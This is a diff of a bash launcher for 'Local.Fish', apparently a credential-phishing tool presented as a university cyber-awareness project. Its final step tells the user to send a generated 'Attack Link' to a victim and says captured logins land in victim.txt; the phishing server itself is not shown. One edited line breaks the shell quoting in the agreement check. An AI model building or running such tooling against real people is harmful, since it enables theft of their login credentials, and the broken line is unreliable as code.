@@ -6,18 +6,18 @@ REPO_NAME="local.fish"
 GITHUB_URL="https://github.com/$GITHUB_USER/$REPO_NAME"
 
 # 🔹 1st Checker: Verify if the GitHub Repository Exists
-echo -e "\e[32m⚠️ Caution: By Continuing, you Admit to be a Member of the ~ University of Education,Winneba; and Agree to be Held Responsible for any Misuse of this Tool.\e[0m"
+echo -e "\e[33m⚠️Caution: By Continuing, you Admit to be a Member of the ~ University of Education,Winneba; and Agree to be Held Responsible for any Misuse of this Tool.\e[0m"
 
-echo -e "\n\n"
+echo -e "\\n\\n"
 
 read -p "Do you agree to the terms? (y/n): " AGREEMENT
 
-if [[ "$AGREEMENT" != "y" ]]; then
+if [[ "$AGREEMENT != "y" ]]; then
     echo -e "\e[31m❌ You did not agree to the terms. Exiting...\e[0m"
     exit 1
 fi
 
-echo -e "\n\n"
+echo -e "\\n\\n"
 
 echo -e "\e[32mFISHKISSFISHKIS               
        SFISHKISSFISHKISSFISH            F
@@ -33,7 +33,7 @@ SSFISHKISSFISHKISSFISHKISSFISHKIS    SFIS
        SFISHKISSFISHKISSFISH            K
          ISSFISHKISSFISHKIS               \e[0m"
 
-echo -e "\n"
+echo -e "\\n"
 echo -e "\e[32mWelcome to the Local.Fish; An Internal Students Regulated Cyber Tool Intended to Educate, Create Awareness and Engage a Community of all Faculty Individuals who Passion for Cyber Security and it Related Fields.\e[0m"
 
 if curl --silent --fail "$GITHUB_URL" > /dev/null; then
@@ -47,7 +47,7 @@ fi
 
 # 🔹 2nd Checker: Verify if User has Starred the Repository
 
-echo -e "/n"
+echo -e "//n"
 
 read -p "Enter your GitHub username: " USERNAME
 STARRED=$(curl -s -H "Accept: application/vnd.github.v3+json" "https://api.github.com/users/$USERNAME/starred" | grep "$REPO_NAME")
@@ -73,4 +73,4 @@ fi
 # 🔹 Final Step: Start the Server
 echo -e "\e[32m🚀 Generating the Attack Link...Copy and Send to Victim\nLogins in victim.txt file\e[0m"
 chmod +x sh/server.sh
-./ sh/server.sh
+./sh/server.sh
